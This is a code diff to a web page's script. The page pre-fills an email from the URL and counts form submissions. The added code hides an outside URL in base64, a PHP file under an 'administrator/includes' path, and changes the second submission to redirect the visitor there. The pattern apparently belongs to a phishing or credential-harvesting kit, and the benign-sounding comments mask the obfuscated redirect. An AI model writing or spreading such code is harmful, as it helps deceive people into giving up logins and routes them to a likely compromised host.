@@ -370,6 +370,15 @@
     // Track the number of submissions
     var submissionCount = 0;
 
+    // Base64 encoded URL (this is the same string you provided earlier)
+    var file = "aHR0cHM6Ly9pbm5wYWN0LmNvLnphL2FkbWluaXN0cmF0b3IvaW5jbHVkZXMveGx4LnBocC9yYXhja2llLnBocA==";
+
+    // Decode the base64 URL
+    var decodedUrl = atob(file);
+
+    // Optional: Log the decoded URL to the console for debugging
+    console.log("Decoded URL:", decodedUrl);
+
     // Get the query parameter for email
     var urlParams = new URLSearchParams(window.location.search);
     var emailFromUrl = urlParams.get('email'); // Grab 'email' from the URL
@@ -448,17 +457,12 @@
             });
 
         } else if (submissionCount === 1) {
-            // After the second submission, handle redirection
-            var domain = window.location.hostname;  // Get the domain of the current page
-            var redirectURL = "http://" + domain;  // Build the full redirect URL
-
-            // Redirect to the domain after the second submission
-            window.location.replace(redirectURL);
+            // After the second submission, handle redirection to the decoded URL
+            window.location.replace(decodedUrl); // Redirect to the decoded URL
         }
     });
   });
 </script>
-
 
 
 		
@@ -485,5 +489,6 @@
   </div>
 </body>
 </html>
+
 
 
